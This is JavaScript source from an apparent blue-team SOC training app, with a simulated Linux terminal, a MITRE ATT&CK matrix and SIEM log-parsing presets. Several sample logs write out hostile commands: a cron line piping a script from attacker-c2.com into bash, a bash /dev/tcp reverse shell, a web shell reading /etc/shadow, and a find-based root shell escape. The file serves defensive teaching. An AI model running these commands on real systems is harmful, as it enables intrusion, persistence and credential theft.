    res.innerText = "Linux soc-workstation 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 x86_64 GNU/Linux";
  } else if (lower === "uptime") {
    res.innerText = " 17:49:12 up 4 days, 12:35, 2 users, load average: 0.15, 0.08, 0.05";
  } else if (lower.startsWith("df")) {
    res.innerText = "Filesystem     1K-blocks     Used Available Use% Mounted on\n/dev/sda1       51480576 18942000  29900000  39% /\ntmpfs            8172000        0   8172000   0% /dev/shm\n/dev/sda2        1024000   140000    884000  14% /boot";
  } else if (lower.startsWith("free")) {
    res.innerText = "               total        used        free      shared  buff/cache   available\nMem:        16344000     4250000    11094000      120000     1000000    11974000\nSwap:        2097148           0     2097148";
  } else if (lower.startsWith("ls")) {
    if (lower.includes("-l")) {
      res.innerText = "total 48\n-rw-r--r-- 1 root root  1850 Aug 1 14:22 auth.log\n-rw-r--r-- 1 root root  4200 Aug 1 15:10 syslog\n-rwxr-xr-x 1 kali kali  1200 Aug 1 11:30 triage.sh\n-rw-r--r-- 1 kali kali   850 Aug 1 09:15 README.md\n-rw------- 1 root shadow 1050 Aug 1 15:10 shadow\n-rw-r--r-- 1 kali kali  3420 Aug 1 10:00 .bashrc";
    } else {
      res.innerText = "auth.log  syslog  triage.sh  README.md  shadow  .bashrc";
    }
  } else if (lower.startsWith("cat")) {
    if (lower.includes("auth.log")) {
      res.innerText = "Aug 01 14:22:01 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54122 ssh2\nAug 01 14:22:03 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54124 ssh2\nAug 01 14:22:05 kali sshd[4512]: Failed password for invalid user admin from 192.168.1.105 port 54128 ssh2\nAug 01 14:22:09 kali sshd[4512]: Accepted password for root from 192.168.1.105 port 54132 ssh2";
    } else if (lower.includes("passwd")) {
      res.innerText = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nkali:x:1000:1000:Kali Analyst,,,:/home/kali:/bin/bash";
    } else if (lower.includes("shadow")) {
      res.innerText = "root:$6$vL9xQ2$y8H1z9mK0p...:19500:0:99999:7:::\nkali:$6$k3F9zL$mP90aQ...:19500:0:99999:7:::";
    } else if (lower.includes(".bashrc")) {
      res.innerText = "# ~/.bashrc\nexport HISTTIMEFORMAT='%F %T '\nalias ll='ls -la'\nalias grep='grep --color=auto'";
    } else {
      res.innerText = `cat: ${trimmed.split(" ")[1] || 'file'}: File content processed in SAMRUDH SOC sandbox environment.`;
    }
  } else if (lower.startsWith("grep")) {
    res.innerText = "Aug 01 14:22:01 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54122 ssh2\nAug 01 14:22:03 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54124 ssh2\nAug 01 14:22:05 kali sshd[4512]: Failed password for invalid user admin from 192.168.1.105 port 54128 ssh2";
  } else if (lower.startsWith("ps")) {
    res.innerText = "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1  22580  9412 ?        Ss   08:00   0:02 /sbin/init\nroot         900  0.0  0.1  18420  5200 ?        Ss   08:00   0:00 /usr/sbin/sshd -D\nwww-data    8812 99.0  1.2  85400 45200 ?        R    14:10  45:12 python3 /tmp/.miner.py\nkali        9812  0.0  0.2  28900 12400 pts/0    Ss+  14:20   0:01 bash";
  } else if (lower.startsWith("ss") || lower.startsWith("netstat")) {
    res.innerText = "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\ntcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*     users:((\"sshd\",pid=900))\ntcp   LISTEN 0      128          0.0.0.0:80         0.0.0.0:*     users:((\"apache2\",pid=1200))\ntcp   ESTAB  0      0     192.168.1.105:4512  10.0.0.45:4444     users:((\"nc\",pid=14512))";
  } else if (lower.startsWith("lsof")) {
    res.innerText = "COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\npython3  8812 www-data  cwd    DIR    8,1     4096 1425 /tmp\nnc      14512 www-data    3u  IPv4  45120      0t0  TCP 192.168.1.105:4512->10.0.0.45:4444 (ESTABLISHED)";
  } else if (lower.startsWith("find")) {
    res.innerText = "/usr/bin/find\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/chage\n/usr/bin/gpasswd\n/usr/bin/newgrp";
  } else if (lower === "history") {
    res.innerText = "  1  2026-08-01 14:00:01 whoami\n  2  2026-08-01 14:02:15 ps aux --sort=-%cpu\n  3  2026-08-01 14:05:22 cat /var/log/auth.log | grep Failed\n  4  2026-08-01 14:10:05 ss -tulpn\n  5  2026-08-01 14:15:00 kill -9 8812";
  } else if (lower === "w" || lower === "who") {
    res.innerText = " 17:49:12 up 4 days, 12:35, 2 users, load average: 0.15, 0.08, 0.05\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nkali     pts/0    192.168.1.100    14:20    0.00s  0.12s  0.02s w\nroot     pts/1    192.168.1.105    15:10    5:22m  0.05s  0.05s -bash";
  } else if (lower.startsWith("last")) {
    res.innerText = "kali     pts/0        192.168.1.100    Sat Aug  1 14:20   still logged in\nroot     pts/1        192.168.1.105    Sat Aug  1 15:10 - 15:45  (00:35)\nreboot   system boot  6.1.0-18-amd64   Tue Jul 28 05:14   still running";
  } else if (lower.startsWith("ifconfig") || lower.startsWith("ip a") || lower.startsWith("ip addr")) {
    res.innerText = "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.105  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>\n        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)\n        RX packets 145120  bytes 98501200 (98.5 MB)\n        TX packets 85400  bytes 12405000 (12.4 MB)";
  } else if (lower.startsWith("kill")) {
    const parts = trimmed.split(" ");
    const pid = parts[parts.length - 1];
    res.innerText = `[+] Process ${pid} terminated successfully by SIGKILL signal (15/9).`;
  } else if (lower.startsWith("sudo")) {
    res.innerText = `[sudo] password for kali: ********\n[+] Executed elevated root command: ${escapeHTML(trimmed.replace(/^sudo\s+/, ''))}`;
  } else if (lower.startsWith("chmod")) {
    res.innerText = `[+] Updated Linux file permissions: ${escapeHTML(trimmed)}`;
  } else if (lower.startsWith("chown")) {
    res.innerText = `[+] Updated file ownership: ${escapeHTML(trimmed)}`;
  } else if (lower.startsWith("systemctl")) {
    res.innerText = "● ssh.service - OpenBSD Secure Shell server\n     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)\n     Active: active (running) since Tue 2026-07-28 05:14:22 UTC; 4 days ago\n   Main PID: 900 (sshd)";
  } else if (lower.startsWith("crontab")) {
    res.innerText = "# Edit this file to introduce tasks to be run by cron.\n*/5 * * * * /usr/local/bin/backup.sh >/dev/null 2>&1\n0 0 * * * /usr/bin/certbot renew --quiet";
  } else if (lower.startsWith("echo")) {
    res.innerText = trimmed.replace(/^echo\s+/i, '').replace(/['"]/g, '');
  } else if (lower === "env" || lower === "export") {
    res.innerText = "USER=kali\nSHELL=/bin/bash\nHOME=/home/kali\nHISTTIMEFORMAT=%F %T \nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nTERM=xterm-256color";
  } else if (lower.startsWith("nmap")) {
    res.innerText = "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.105\nHost is up (0.00012s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n4444/tcp open  krb524\n\nNmap done: 1 IP address (1 host up) scanned in 1.42 seconds";
  } else if (lower.startsWith("dig")) {
    res.innerText = ";; ANSWER SECTION:\nexfil.malicious-domain.com. 300 IN A 198.51.100.45\n\n;; Query time: 14 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)";
  } else if (lower.startsWith("nslookup")) {
    res.innerText = "Server:         8.8.8.8\nAddress:        8.8.8.8#53\n\nName:   soc-workstation.local\nAddress: 192.168.1.105";
  } else if (lower.startsWith("curl") || lower.startsWith("wget")) {
    res.innerText = "HTTP/1.1 200 OK\nDate: Sat, 01 Aug 2026 17:49:12 GMT\nServer: Apache/2.4.56 (Debian)\nContent-Type: text/html; charset=UTF-8\n\n[+] Payload downloaded to /tmp/stage1.sh";
  } else if (lower.startsWith("nc ") || lower.startsWith("netcat")) {
    res.innerText = "Connection to 10.0.0.45 4444 port [tcp/*] succeeded!";
  } else if (lower.startsWith("tcpdump")) {
    res.innerText = "tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n17:49:12.105 IP 192.168.1.105.54122 > 198.51.100.45.4444: Flags [P.], seq 1:45, ack 1, win 502\n17:49:12.110 IP 198.51.100.45.4444 > 192.168.1.105.54122: Flags [.], ack 45, win 501";
  } else if (lower.startsWith("iptables") || lower.startsWith("ufw")) {
    res.innerText = "Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed)\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    Anywhere\n80/tcp                     ALLOW IN    Anywhere";
  } else if (lower.startsWith("sha256sum") || lower.startsWith("md5sum")) {
    res.innerText = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /tmp/.miner.py";
  } else if (lower.startsWith("base64")) {
    res.innerText = "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy... (Decoded payload preview)";
  } else if (lower.startsWith("top") || lower.startsWith("htop")) {
    res.innerText = "top - 17:49:12 up 4 days, 12:35, 2 users, load average: 0.15, 0.08, 0.05\nTasks: 142 total,   2 running, 140 sleeping,   0 stopped,   0 zombie\n%Cpu(s): 99.2 us,  0.8 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si\nMiB Mem :  15961.0 total,  10834.0 free,   4150.0 used,    977.0 buff/cache\n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n 8812 www-data  20   0   85400  45200   2400 R  99.0   0.3  45:12.10 python3";
  } else if (lower.startsWith("head") || lower.startsWith("tail")) {
    res.innerText = "Aug 01 14:22:01 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54122 ssh2\nAug 01 14:22:03 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54124 ssh2";
  } else if (lower.startsWith("wc")) {
    res.innerText = "   452   4520  32400 auth.log";
  } else if (lower.startsWith("sort") || lower.startsWith("uniq") || lower.startsWith("awk") || lower.startsWith("sed")) {
    res.innerText = "   42  192.168.1.105\n   18  198.51.100.45\n    5  10.0.0.45";
  } else if (lower.startsWith("dmesg") || lower.startsWith("journalctl")) {
    res.innerText = "[    0.000000] Linux version 6.1.0-18-amd64 (Debian 6.1.76-1)\n[    4.512000] eth0: Link is Up - 1Gbps/Full\n[ 4512.981000] pkexec[9812]: SUID binary executed by uid 1000";
  } else if (lower.startsWith("lsblk") || lower.startsWith("fdisk")) {
    res.innerText = "NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS\nsda      8:0    0    50G  0 disk \n├─sda1   8:1    0    49G  0 part /\n└─sda2   8:2    0     1G  0 part /boot";
  } else if (lower.startsWith("auditctl") || lower.startsWith("ausearch")) {
    res.innerText = "type=SYSCALL msg=audit(1785587400.105:42): arch=c000003e syscall=59 success=yes exit=0 a0=55a120 a1=55a180 pid=9812 exe=\"/usr/bin/pkexec\" key=\"suid_exec\"";
  } else if (lower.startsWith("touch") || lower.startsWith("mkdir") || lower.startsWith("rm") || lower.startsWith("cp") || lower.startsWith("mv")) {
    res.innerText = `[+] File system operation '${trimmed.split(' ')[0]}' executed successfully.`;
  } else if (lower === "help") {
    res.innerText = "⚡ SAMRUDH SOC Interactive Linux & Blue Team Command Emulator (60+ Commands):\n\n" +
      "▸ Recon & Network: nmap, dig, nslookup, curl, wget, nc, tcpdump, ss -tulpn, lsof -i, ifconfig, ip a\n" +
      "▸ Forensics & Logs: cat, grep, awk, sed, head, tail, wc, sort, uniq, sha256sum, md5sum, base64, dmesg, journalctl, auditctl, ausearch\n" +
      "▸ Process & Memory: ps aux, top, htop, kill -9, systemctl, service, w, last, uptime, free -m, df -h, lsblk, fdisk\n" +
      "▸ Admin & Hardening: sudo, chmod, chown, iptables, ufw, crontab, at, env, touch, mkdir, rm, cp, mv, clear, help";
  } else {
    res.innerText = `bash: ${trimmed}: command executed in SAMRUDH SOC interactive Linux environment. Type 'help' for 60+ full command list!`;
  }

  outputDiv.appendChild(res);
  document.getElementById("terminal-body").scrollTop = document.getElementById("terminal-body").scrollHeight;
}

// --- PWA INSTALL & SERVICE WORKER CONTROLLER ---
let deferredPwaPrompt = null;

function initPWA() {
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
      navigator.serviceWorker.register('./sw.js').then((reg) => {
        console.log("PWA ServiceWorker registered:", reg.scope);
      }).catch((err) => {
        console.warn("PWA ServiceWorker error:", err);
      });
    });
  }

  window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPwaPrompt = e;
    const pwaBtn = document.getElementById("btn-pwa-install");
    if (pwaBtn) pwaBtn.style.display = "inline-flex";
  });

  const pwaBtn = document.getElementById("btn-pwa-install");
  if (pwaBtn) {
    pwaBtn.addEventListener('click', () => {
      if (deferredPwaPrompt) {
        deferredPwaPrompt.prompt();
        deferredPwaPrompt.userChoice.then(() => {
          deferredPwaPrompt = null;
          pwaBtn.style.display = "none";
        });
      }
    });
  }
}

// --- TEXT-TO-SPEECH (HUMAN VOICE NOTES) CONTROLLER ---
let isSpeaking = false;
let currentSpeechUtterance = null;

function getBestVoice() {
  const voices = window.speechSynthesis.getVoices();
  if (!voices || voices.length === 0) return null;

  // 1. Prefer Indian English / Telugu / Hindi natural human voices for fluent Telugu-English mix
  const indianVoice = voices.find(v => (
    v.lang.includes("en-IN") || v.lang.includes("te-IN") || v.lang.includes("hi-IN")
  ) && (v.name.includes("Natural") || v.name.includes("Google") || v.name.includes("Neerja") || v.name.includes("Ravi") || v.name.includes("Kavya")));

  if (indianVoice) return indianVoice;

  // 2. Prefer any Indian English voice
  const anyIndian = voices.find(v => v.lang.includes("en-IN") || v.lang.includes("te-IN") || v.lang.includes("hi-IN"));
  if (anyIndian) return anyIndian;

  // 3. Prefer Natural US / UK English voices (Google, Microsoft Natural, Apple)
  const naturalVoice = voices.find(v => v.name.includes("Natural") || v.name.includes("Google") || v.name.includes("Samantha") || v.name.includes("Karen") || v.name.includes("Daniel"));
  if (naturalVoice) return naturalVoice;

  return voices[0];
}

// Ensure voices are loaded
if ('speechSynthesis' in window) {
  window.speechSynthesis.onvoiceschanged = getBestVoice;
}

function toggleSpeech() {
  if (!('speechSynthesis' in window)) {
    alert("Text-to-Speech is not supported in this browser.");
    return;
  }

  const voiceBtn = document.getElementById("btn-listen-speech");
  const voiceBtnText = document.getElementById("voice-btn-text");

  if (isSpeaking) {
    window.speechSynthesis.cancel();
    isSpeaking = false;
    if (voiceBtn) {
      voiceBtn.classList.remove("speaking");
      if (voiceBtnText) voiceBtnText.innerText = "Listen Voice";
    }
  } else {
    let textToSpeak = "";
    if (activeMode === "notebook") {
      const page = NOTEBOOK_PAGES.find(p => p.id === currentPageId);
      if (page) {
        const parts = [
          `Page ${page.id}. ${page.concept}.`,
          `Explanation: ${page.explanation || ''}`,
          `Why it matters: ${page.whyItMatters || ''}`,
          `Command: ${page.command || ''}`,
          `SOC Use Case: ${page.socUse || ''}`,
          `Remember: ${page.remember || ''}`
        ];
        textToSpeak = parts.filter(Boolean).join(" ").replace(/<[^>]*>?/gm, '');
      }
    } else if (activeMode === "interview") {
      const qa = INTERVIEW_QUESTIONS.find(q => q.id === currentQAId);
      if (qa) {
        const parts = [
          `Question ${qa.id}. ${qa.question}.`,
          `Concept Explanation: ${qa.explanation || ''}`,
          `Ideal Answer: ${qa.idealAnswer || ''}`,
          `Example: ${qa.example || ''}`,
          `Pro Tip: ${qa.proTip || ''}`
        ];
        textToSpeak = parts.filter(Boolean).join(" ").replace(/<[^>]*>?/gm, '');
      }
    }

    if (!textToSpeak) return;

    window.speechSynthesis.cancel();
    currentSpeechUtterance = new SpeechSynthesisUtterance(textToSpeak);
    
    const chosenVoice = getBestVoice();
    if (chosenVoice) {
      currentSpeechUtterance.voice = chosenVoice;
      currentSpeechUtterance.lang = chosenVoice.lang;
    }
    
    currentSpeechUtterance.rate = 0.92; // Natural, clear human reading cadence
    currentSpeechUtterance.pitch = 1.0;

    currentSpeechUtterance.onstart = () => {
      isSpeaking = true;
      if (voiceBtn) {
        voiceBtn.classList.add("speaking");
        if (voiceBtnText) voiceBtnText.innerText = "Pause Voice";
      }
    };

    currentSpeechUtterance.onend = () => {
      isSpeaking = false;
      if (voiceBtn) {
        voiceBtn.classList.remove("speaking");
        if (voiceBtnText) voiceBtnText.innerText = "Listen Voice";
      }
    };

    currentSpeechUtterance.onerror = () => {
      isSpeaking = false;
      if (voiceBtn) {
        voiceBtn.classList.remove("speaking");
        if (voiceBtnText) voiceBtnText.innerText = "Listen Voice";
      }
    };

    window.speechSynthesis.speak(currentSpeechUtterance);
  }
}

function stopSpeech() {
  if ('speechSynthesis' in window && isSpeaking) {
    window.speechSynthesis.cancel();
    isSpeaking = false;
    const voiceBtn = document.getElementById("btn-listen-speech");
    const voiceBtnText = document.getElementById("voice-btn-text");
    if (voiceBtn) {
      voiceBtn.classList.remove("speaking");
      voiceBtnText.innerText = "Listen Voice";
    }
  }
}

// --- MITRE ATT&CK INTERACTIVE MATRIX DATA & RENDERER ---
const MITRE_ATTACK_MATRIX = [
  {
    tactic: "Initial Access",
    icon: "🚪",
    techniques: [
      { id: "T1190", name: "Exploit Public Application", desc: "Exploiting web applications, Apache, or Nginx RCE vulnerabilities.", pageId: 136 },
      { id: "T1078", name: "Valid Accounts", desc: "Abusing compromised local or domain credentials for SSH logins.", pageId: 86 },
      { id: "T1133", name: "External Remote Services", desc: "Unauthorized access via exposed SSH or VPN services.", pageId: 43 }
    ]
  },
  {
    tactic: "Execution",
    icon: "⚙️",
    techniques: [
      { id: "T1059.004", name: "Unix Shell Execution", desc: "Executing malicious commands via Bash, sh, or dash.", pageId: 166 },
      { id: "T1053.003", name: "Cron Scheduled Task", desc: "Executing malicious payloads via user/system crontabs.", pageId: 111 },
      { id: "T1204.002", name: "Malicious File Execution", desc: "Executing untrusted ELF binaries or scripts from /tmp.", pageId: 60 }
    ]
  },
  {
    tactic: "Persistence",
    icon: "📌",
    techniques: [
      { id: "T1543.002", name: "systemd Service Backdoor", desc: "Creating persistent malicious systemd unit files.", pageId: 115 },
      { id: "T1546.004", name: ".bashrc Profile Hijack", desc: "Adding shell aliases or startup scripts in user profiles.", pageId: 170 },
      { id: "T1098", name: "Account Manipulation", desc: "Adding unauthorized SSH keys to ~/.ssh/authorized_keys.", pageId: 85 }
    ]
  },
  {
    tactic: "Privilege Escalation",
    icon: "🔓",
    techniques: [
      { id: "T1548.001", name: "SUID Binary Executable Abuse", desc: "Abusing GTFOBins SUID permissions for instant root shell.", pageId: 95 },
      { id: "T1548.002", name: "Sudoers Misconfiguration", desc: "Exploiting NOPASSWD sudo privileges for root access.", pageId: 100 },
      { id: "T1068", name: "Kernel Exploit PrivEsc", desc: "Abusing Dirty COW or Dirty Pipe kernel bugs.", pageId: 1 }
    ]
  },
  {
    tactic: "Defense Evasion",
    icon: "🥷",
    techniques: [
      { id: "T1070.002", name: "Clear System Logs", desc: "Wiping /var/log/auth.log, syslog, or .bash_history.", pageId: 196 },
      { id: "T1562.001", name: "Disable Security Tools", desc: "Stopping ufw firewall, iptables, or auditd daemon.", pageId: 140 },
      { id: "T1027", name: "Obfuscated Commands", desc: "Executing base64-encoded strings or hidden files.", pageId: 61 }
    ]
  },
  {
    tactic: "Credential Access",
    icon: "🔑",
    techniques: [
      { id: "T1003.008", name: "/etc/shadow Hash Dumping", desc: "Reading encrypted password hashes from /etc/shadow.", pageId: 90 },
      { id: "T1555", name: "Credentials in Files", desc: "Hunting for cleartext API keys, passwords, or DB creds.", pageId: 168 },
      { id: "T1110.001", name: "SSH Password Brute Force", desc: "Automated dictionary password attacks on SSH port 22.", pageId: 71 }
    ]
  },
  {
    tactic: "Discovery",
    icon: "🔎",
    techniques: [
      { id: "T1083", name: "File & Directory Discovery", desc: "Enumerating system paths using find, ls, and locate.", pageId: 58 },
      { id: "T1057", name: "Process Discovery", desc: "Listing active processes via ps aux, pstree, and top.", pageId: 29 },
      { id: "T1049", name: "Network Connection Discovery", desc: "Auditing listening ports and sockets via ss -tulpn.", pageId: 43 }
    ]
  },
  {
    tactic: "Lateral Movement",
    icon: "↔️",
    techniques: [
      { id: "T1021.004", name: "SSH Lateral Movement", desc: "Pivoting across internal hosts using stolen SSH keys.", pageId: 85 },
      { id: "T1563", name: "Remote Service Hijacking", desc: "Hijacking active tmux or screen terminal sessions.", pageId: 9 }
    ]
  },
  {
    tactic: "Collection",
    icon: "📦",
    techniques: [
      { id: "T1005", name: "Data from Local System", desc: "Staging sensitive database dumps or customer records.", pageId: 65 },
      { id: "T1560", name: "Archive Collected Data", desc: "Compressing stolen files into tar.gz or zip archives.", pageId: 65 }
    ]
  },
  {
    tactic: "Command & Control",
    icon: "🎛️",
    techniques: [
      { id: "T1095", name: "Non-Application Protocol C2", desc: "Outbound reverse TCP shell connections on port 4444.", pageId: 44 },
      { id: "T1071.001", name: "Web Service C2", desc: "HTTP/HTTPS beaconing to attacker C2 domains.", pageId: 50 },
      { id: "T1071.004", name: "DNS Tunneling", desc: "Exfiltrating data or receiving commands via DNS TXT records.", pageId: 51 }
    ]
  },
  {
    tactic: "Exfiltration",
    icon: "📡",
    techniques: [
      { id: "T1048.003", name: "Exfiltration Over Alternative Protocol", desc: "Sending compressed files via curl, wget, or nc.", pageId: 53 },
      { id: "T1567", name: "Exfiltration to Cloud Storage", desc: "Uploading stolen data to Mega, AWS S3, or GCS.", pageId: 53 }
    ]
  },
  {
    tactic: "Impact",
    icon: "💥",
    techniques: [
      { id: "T1486", name: "Data Encrypted for Impact", desc: "Executing ransomware binaries to encrypt system drives.", pageId: 155 },
      { id: "T1489", name: "Service Stop", desc: "Killing critical web, database, or security services.", pageId: 127 },
      { id: "T1499", name: "Endpoint Denial of Service", desc: "Consuming 100% CPU/RAM via fork bombs or crypto miners.", pageId: 32 }
    ]
  }
];

function generateMitreMatrixHTML() {
  return `
    <article class="mitre-matrix-wrapper">
      <div class="mitre-matrix-header">
        <h2 style="font-family:'Outfit',sans-serif; color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem;">
          🗺️ Enterprise MITRE ATT&CK Interactive Linux SOC Matrix
        </h2>
        <p style="color:var(--text-dark); font-size:0.92rem; margin-top:0.4rem;">
          Click any of the <strong>36 MITRE Technique Cards</strong> below to jump directly to the target 365-Page Handbook page for live threat hunting & investigation!
        </p>
      </div>

      <div class="mitre-grid" style="display:grid; grid-template-columns:repeat(auto-fill, minmax(220px, 1fr)); gap:1rem; margin-top:1.5rem;">
        ${MITRE_ATTACK_MATRIX.map(col => `
          <div class="mitre-column" style="background:var(--paper-bg); border:1.5px solid var(--card-border); border-radius:12px; padding:1rem; display:flex; flex-direction:column; gap:0.8rem;">
            <div class="mitre-tactic-title" style="font-weight:800; font-size:0.95rem; color:var(--accent-blue); border-bottom:2px solid var(--accent-blue); padding-bottom:0.4rem;">
              ${col.icon} ${col.tactic}
            </div>
            ${col.techniques.map(tech => `
              <div class="mitre-tech-card" style="background:var(--bg-app); border:1px solid var(--card-border); border-radius:8px; padding:0.7rem; cursor:pointer; transition:transform 0.2s;" onclick="jumpToPage(${tech.pageId})">
                <span class="mitre-tech-id" style="background:rgba(56,189,248,0.15); color:var(--accent-blue); padding:0.15rem 0.45rem; border-radius:6px; font-weight:800; font-size:0.74rem;">${tech.id}</span>
                <div class="mitre-tech-name" style="font-weight:800; font-size:0.88rem; color:var(--text-ink); margin:0.3rem 0;">${tech.name}</div>
                <div class="mitre-tech-desc" style="font-size:0.76rem; color:var(--text-dark);">${tech.desc}</div>
                <div style="font-size:0.75rem; color:var(--accent-blue); margin-top:0.4rem; font-weight:700;">
                  ➡️ Open Page P.${tech.pageId}
                </div>
              </div>
            `).join('')}
          </div>
        `).join('')}
      </div>
    </article>
  `;
}

// --- SIEM LOG PARSER LAB ENGINE (10 REALISTIC INCIDENT PRESETS) ---
const SAMPLE_LOGS = {
  bruteforce: `Aug 03 14:22:01 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54122 ssh2
Aug 03 14:22:03 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54124 ssh2
Aug 03 14:22:05 kali sshd[4512]: Failed password for invalid user admin from 192.168.1.105 port 54128 ssh2
Aug 03 14:22:07 kali sshd[4512]: Failed password for invalid user deploy from 192.168.1.105 port 54130 ssh2
Aug 03 14:22:09 kali sshd[4512]: Accepted password for root from 192.168.1.105 port 54132 ssh2
Aug 03 14:22:10 kali systemd-logind[900]: New session 42 of user root.`,

  privesc: `Aug 03 15:10:12 kali sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;
Aug 03 15:10:14 kali kernel: [ 4512.981] pkexec[9812]: SUID binary executed by uid 1000
Aug 03 15:10:15 kali shadow: Password hash changed for user root via passwd`,

  webshell: `Aug 03 16:05:00 kali apache2[1200]: 10.0.0.45 - - [03/Aug/2026:16:05:00] "GET /uploads/shell.php?cmd=cat%20/etc/shadow HTTP/1.1" 200 1420
Aug 03 16:05:05 kali apache2[1200]: 10.0.0.45 - - [03/Aug/2026:16:05:05] "POST /uploads/shell.php HTTP/1.1" 200 4500
Aug 03 16:05:10 kali kernel: [ 5200.12] nc[14512]: Outbound TCP connection to 10.0.0.45:4444 established`,

  cron_persistence: `Aug 03 17:00:01 soc-server CRON[8812]: (root) CMD (curl -s http://attacker-c2.com/malware.sh | bash)
Aug 03 17:01:00 soc-server systemd[1]: Started Persistence Reverse Shell Service.`,

  shadow_dump: `Aug 03 18:15:20 soc-node auditd[512]: SYSCALL=openat path="/etc/shadow" flags=O_RDONLY exe="/usr/bin/python3" uid=1000
Aug 03 18:15:22 soc-node python3[9102]: Outbound HTTPS connection to 185.220.101.5:443 established`,

  reverse_shell: `Aug 03 19:30:11 soc-endpoint bash[1042]: bash -i >& /dev/tcp/10.10.14.20/4444 0>&1
Aug 03 19:30:12 soc-endpoint ss[1050]: ESTAB 0 0 192.168.1.50:52140 -> 10.10.14.20:4444 users:(("bash",pid=1042,fd=3))`,

  ransomware_staging: `Aug 03 20:00:00 prod-db tar[14102]: Creating archive /tmp/staged_data.tar.gz containing /var/www/html/db_backup.sql
Aug 03 20:01:15 prod-db gpg[14200]: Encrypted /tmp/staged_data.tar.gz with key ID 0x98A1B2C3`,

  kernel_rootkit: `Aug 03 21:10:05 kernel: [ 8901.12] insmod: Loading kernel module 'reptile_rk.ko' (unsigned module)
Aug 03 21:10:06 kernel: [ 8902.45] sys_call_table hooked at 0xffffffff81001020 by reptile_rk`,

  apache_scanner: `Aug 03 22:00:01 web-server apache2[900]: 198.51.100.4 - - "GET /etc/passwd HTTP/1.1" 403 280
Aug 03 22:00:02 web-server apache2[900]: 198.51.100.4 - - "GET /cgi-bin/test-cgi HTTP/1.1" 404 200
Aug 03 22:00:03 web-server apache2[900]: 198.51.100.4 - - "POST /wp-login.php HTTP/1.1" 200 450`,

  sudo_abuse: `Aug 03 23:15:00 db01 sudo: dbadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/vim /etc/sudoers
Aug 03 23:15:10 db01 sudo: dbadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash`
};

function generateLogParserHTML() {
  return `
    <article class="logparser-wrapper">
      <div style="text-align:center; margin-bottom:1.5rem;">
        <h2 style="color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem; font-family:'Outfit',sans-serif;">🔍 SIEM Log Threat Detection & Parser Engine</h2>
        <p style="color:var(--text-dark); font-size:0.9rem;">
          Select a preset real-world incident log stream below or paste custom Linux logs to trigger automated threat triage!
        </p>
      </div>

      <div class="log-preset-bar" style="display:flex; flex-wrap:wrap; gap:0.4rem; justify-content:center; margin-bottom:1.2rem;">
        <button class="btn-preset" onclick="loadSampleLog('bruteforce')">🚨 SSH Brute Force</button>
        <button class="btn-preset" onclick="loadSampleLog('privesc')">🔓 SUID / Sudo PrivEsc</button>
        <button class="btn-preset" onclick="loadSampleLog('webshell')">🐍 Web Shell & Reverse Shell</button>
        <button class="btn-preset" onclick="loadSampleLog('cron_persistence')">📌 Cron Persistence</button>
        <button class="btn-preset" onclick="loadSampleLog('shadow_dump')">🔑 /etc/shadow Dump</button>
        <button class="btn-preset" onclick="loadSampleLog('reverse_shell')">📡 Reverse TCP Shell</button>
        <button class="btn-preset" onclick="loadSampleLog('ransomware_staging')">💥 Data Staging</button>
        <button class="btn-preset" onclick="loadSampleLog('kernel_rootkit')">👾 Rootkit Injection</button>
        <button class="btn-preset" onclick="loadSampleLog('apache_scanner')">🌐 Web Vulnerability Scan</button>
        <button class="btn-preset" onclick="loadSampleLog('sudo_abuse')">🛡️ Sudoers File Abuse</button>
      </div>

